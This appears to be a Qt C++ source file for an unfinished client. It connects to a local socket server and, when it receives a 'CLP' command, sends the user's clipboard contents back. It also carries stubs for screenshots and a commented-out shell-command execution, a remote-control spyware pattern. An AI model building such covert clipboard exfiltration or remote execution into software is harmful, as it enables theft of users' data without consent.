#include "mainwindow.h"
#include "ui_mainwindow.h"



MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    this->networdHandler = NIL;
    this->clientSocket = new QTcpSocket(this);
    this->clientSocket->connectToHost("127.0.0.1",1337);
    connect(clientSocket, &QAbstractSocket::readyRead, this, &MainWindow::read);
    QMimeData myMimeData;
    Screenshot *scshot = new Screenshot();

    /*while(true)
    {
        //QTest::qWait(1000);
        //usleep(10000);
        //qDebug() << "sleeping";
}
*/
//system(qPrintable(command));
}
void MainWindow::read(){
  QString returnStr = QByteArray::fromBase64(this->clientSocket->readAll());
  qDebug() << returnStr;
  qDebug() << "Received Data";
  if(returnStr.contains("CLP"))
  {
          MainWindow::sendCmd(this->clippy->getclipboardString());
}
  switch (this->networdHandler) {
/*
    case SYS:
      {
        ClipboardWindow* c = new ClipboardWindow(this, returnStr);
        c->show();
        break;
      }
      */
    case CLP:
      {
        MainWindow::sendCmd(this->clippy->getclipboardString());
        break;
      }

    case EXT:
      {
        QString fileName = QFileDialog::getSaveFileName(this,tr("Open Database"), "",tr("Virus database (*.vdb)"));
        QFile *saveFile = new QFile(fileName);
        if (!saveFile->open(QIODevice::WriteOnly)) {
            qWarning("Couldn't open save file.");
            return;
        }
        saveFile->write(returnStr.toUtf8());
        break;
      }
    case SCR:
      QMessageBox::information(this, "Serbian Command", "Not implemented yet");
      break;
    default:
      qDebug() << "Received unwanted response: " + returnStr;
      break;
  }

  this->networdHandler = NIL;
}
void MainWindow::sendCmd(QString cmd){
  this->clientSocket->write((cmd + "\n").toUtf8().toBase64());
  this->clientSocket->flush();
}
MainWindow::~MainWindow()
{
    delete ui;
}

